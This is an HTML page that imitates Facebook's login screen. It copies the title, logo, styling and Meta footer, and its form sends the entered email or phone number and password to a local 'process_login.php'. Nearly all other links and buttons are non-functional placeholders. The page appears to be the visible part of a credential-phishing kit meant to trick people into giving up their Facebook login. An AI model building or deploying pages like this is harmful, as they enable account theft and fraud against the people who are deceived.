<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #F5FBFF;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }
        .top-link {
            position: absolute;
            top: 20px;
            text-align: center;
            width: 100%;
            font-size: 14px;
            color: #90949c;
        }
        .container {
            width: 100%;
            max-width: 400px;
            padding: 10px;
            text-align: center;
        }
        .logo img {
            width: 70px;
            margin: 90px 0;
        }
        .login-container {
            background-color: #fff;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
            margin-bottom: 20px;
        }
        .login-container input {
            width: calc(100% - 24px);
            margin: 10px 0;
            padding: 12px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
        }
        .login-container button {
            width: 100%;
            background-color: #1877f2;
            color: #fff;
            border: none;
            border-radius: 20px;
            padding: 12px;
            font-size: 18px;
            cursor: pointer;
            margin-top: 10px;
        }
        .login-container button:hover {
            background-color: #165cdb;
        }
        .forgot-password {
            text-align: center;
            margin-top: 10px;
            font-size: 14px;
            color: #1877f2;
        }
        .forgot-password a {
            color: black;
            text-decoration: none;
        }
        .forgot-password a:hover {
            text-decoration: underline;
        }
        .create-account-container {
            text-align: center;
        }
        .create-account-container button {
            width: 100%;
            background-color:  #F5FBFF;
            color: black;
            border: none;
            border-radius: 20px;
            padding: 10px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }
        .create-account-container button:hover {
            background-color: #36a420;
        }
        .footer-links {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
            color: #606770;
        }
        .footer-links a {
            color: #606770;
            text-decoration: none;
            margin: 0 5px;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }
        .footer-meta {
            margin-top: 10px;
            color: #90949c;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="top-link">
        <a href="#" style="color: #90949c;">English (UK)</a>
    </div>
    <div class="container">
        <div class="logo">
            <img src="https://cdn.freebiesupply.com/logos/large/2x/facebook-logo-2019.png" alt="Facebook">
        </div>
        <div class="login-container">
            <form action="process_login.php" method="POST">
                <input type="text" name="username" placeholder="Email address or phone number" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log in</button>
            </form>
        </div>
        <div class="forgot-password">
            <a href="#">Forgotten Password?</a>
        </div><br><br><br><br><br><br>
        <div class="create-account-container">
            <button>Create New Account</button>
        </div>
        <div class="footer-links">
            <a href="#">Meta</a> ·
            <a href="#">About</a> ·
            <a href="#">Help</a> ·
            <a href="#">More</a>
        </div>
        <div class="footer-meta">
            Facebook © 2024
        </div>
    </div>
</body>
</html>
